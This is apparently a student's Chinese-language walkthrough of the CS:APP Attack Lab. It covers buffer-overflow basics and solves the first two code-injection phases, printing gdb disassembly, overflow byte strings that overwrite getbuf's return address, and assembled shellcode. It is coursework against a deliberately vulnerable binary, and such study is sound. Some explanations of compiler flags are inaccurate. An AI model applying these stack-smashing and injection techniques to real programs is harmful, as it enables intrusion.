# Attack Lab preview

# 1 requirements

## 1.1 cite

- CSAPP 3.10~3.12 「3rd edition」
- Attack lab [writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

## 1.2 relative knowledge

c语言**对于数组的引用**不进行任何的**边界检查**，并且局部变量和状态信息「如保存的寄存器值和返回地址」都会存放在栈中，如果对越界的数组进行写操作时，会破坏栈中的状态信息，常见的即为`缓冲区溢出`。这个时候可以表述为是字符串的长度超出了为数组分配的空间

书本中「p177-179」提过的「echo」即为示例。

> 此时的缓冲区只有8个字节，任何长度超过7个字符的字符串都将越界

对于编写的代码进行优化的方法是：

```bash
linux> gcc -fno-asynchonous-unwind-tables -fno-stack-protector -O1 -S echo.c
```

- `-fno-asynchonous-unwind-tables`: 用来不生成[CFI](https://en.wikipedia.org/wiki/Control-flow_integrity)「control flow intergrity」指令
- `-fno-stack-protector`: 组织进行栈破坏检测，默认允许使用栈保护者
- `-O1`: 不做任何优化处理
- `-S`: 生成汇编代码后即结束

**优化后，** 程序会在栈上为字符数组分配更多的字节防止缓冲区溢出，但是如果输入的字节超出了安全字节数，会将echo的返回地址给破坏，这个即是`缓冲区溢出漏洞`。

在attack lab中，我们需要利用栈检测机制来解决5个phases

# 2 solutions -- ctarget

## 2.1 table of contents

- `cookie.txt`: 8位的16位进制数，作为攻击的标志符
- `fram.c`： rop攻击中作为gadgets的产生源
- `ctarget:` code-injection 文件
- `rtarget`: rop攻击的target文件
- `hex2row:` 将16进制数转化为攻击字符，因为有些字符在屏幕上无法显示，由字符的16进制数，自动转化为该字符

## 2.2 level 1

> non-injection，需要做的是劫持程序流，将函数的正常返回地址重写，使函数重定向于指定的函数。在这里，需要重定向到`touch1`函数

因为担心的是在调用getbuf时返回的地址会出现错误，一般地址会存储在栈帧的下8个字节，因此需要在原先正常的返回地址上填充touch1函数的地址。

`ctarget`流程: $test()\rightarrow touch1()$

1. 在`test()`中调用了`getbuf()`，输入字符串后，正常退出时，会执行`exit(0)`的方法。

```gdb
gdb ctarget;
```

2. 之后，我们调用

```bash
disas getbuf
```

得到：

```bash
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq  
```

> 从这里我们可以得到在getbuf中分配了0x28=40个字节的空间

3. 查看`touch1()`的地址

```bash
disas touch1
```

```bash
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
```

> 得到touch1()的地址是`0x4017c0`

得到以上需要的信息后，构建输入字符，来填充栈。因为我们的目的值返回`touch1()`，因此输入任意字符串均可，但是在最后需要填充`touch1()`的地址

目前大部分电脑采用的都为`little-endian`「小端序」的机器，低位在低位，高位于高位，因此我们这里需要逆着输入文本，即后8位的地址为`c0 17 40 00` 

> 在[`endian`排序](https://blog.csdn.net/xiangguiwang/article/details/70036637)中，看的是有效位的级别进行排序，不是<font color=red>**数值大小**</font>。
>
> 如在原先的地址中最高有效位为00，c0则为最低有效位，小端序中反过来有：
>
> 此时的最高位为c0，最低位为00，其他位置跟着逆序，而不是按照大小来排

因此在这里我们需要输入的文本除了input的40个字节外，加上之后的8位字节即为

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

> 这中间mac的文本编辑一开始保存的文件位`.rtf`格式，但是`hex2raw`提供转换的仅有`.txt`格式，而直接修改`.rtf`格式会有乱码。
>
> mac中在文本编辑处选择`ctrl+shift+t`即为纯文本模式，之后自动保存的也为`txt`文件

最后需要通过`hex2raw`来转换字节码序列,将该二进制txt文件保存在`level1.txt`文件中后，过关：

```bash
./hex2raw -i solutions/level1.txt | ./ctarget -q
```

## 2.3 level 2

1. 先看一下touch2做了啥

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
  printf("Touch2!: You called touch2(0x%.8x)\n", val);
  validate(2);
}else {
  printf("Misfire: You called touch2(0x%.8x)\n", val);
  fail(2);
}
	exit(0);
}
```

> touch2验证的是cookie中的值与传入的val是否相等

而cookie与getbuf有关，所以题目需要我们插入一小段代码来拦截程序流，得到正确的输入

**解题思路为：**

- 将正常的返回地址设置为插入代码的地址，而插入的位置需要直接在栈顶插入，即返回地址需要设置为`%rsp`的地址
- 将`cookie`的值移入到`%rdi`中，`%rdi`即为函数调用的第一个参数
- 返回`touch2`的起始地址

- 需要调用touch2，但是不能直接使用call，jmp这些指令，因此只能使用ret改变当前指令寄存器的指向地址，而ret是从栈上弹出的返回地址，所以在调用之前需要先将touch2的地址压栈

由cookies`0x59b997fa`得到需要传进第一个参数寄存器的地址，又因为我们需要把touch2的地址返回到栈顶，因此得到寄存器的操作为：

```bash
mov  $0x59b997fa, %rdi 
push $0x4017ec
retq
```

> 这里的`0x4017ec`即touch2的地址
>
> (gdb)disas touch2     ---------> to get the addr

现在我们需要把这个汇编代码转为字节码：

2. 汇编 --- > 字节序列

> 上述汇编保存为了`level2.s`

```bash
gcc -c level2.s
objdump -d level2.o
```

得到：

```bash
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq  
```

上述则为我们需要往getbuf中插入的字节序列，注意在最后要加入返回的地址

3. 求`%rsp`地址

`%rsp`作为栈帧的首地址，需要从上一个调用的`getbuf()`中获得，这里需要对`getbuf`设置断点才行，因为`getbuf`后还会执行其余的流程

- 设置断点

```bash
break getbuf % 设置第一个断点
run -q			 % 运行
disas        % 看看这个断点的反汇编
stepi				 % 到下一个断点，此时返回的%rsp即为
print /x $rsp% 打印$rsp的地址
```

得到`%rsp`的地址为：`0x5561dc78`，记住小端序

4. 最后结果

```bash
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

## 2.4 level 3

> phase 3 与phase 2 一样，需要插入代码，但是需要将字符串作为变量传入

1. 先来看看touch3 做了什么

> touch3 中需要hexmatch的协助

- **hexmatch**

```c++
int hexmatch(unsigned val, char *sval){
  char cbuf[110];
  /*  Make position of check string unpredictable */
  char *s = cbuf + random()%100; 
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

- **touch3**

```c++
void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
	printf("Touch3!: You called touch3(\"%s\")\n", sval);
	validate(3);
	}else {
	printf("Misfire: You called touch3(\"%s\")\n", sval);
	fail(3);
	}
	exit(0);
}
```











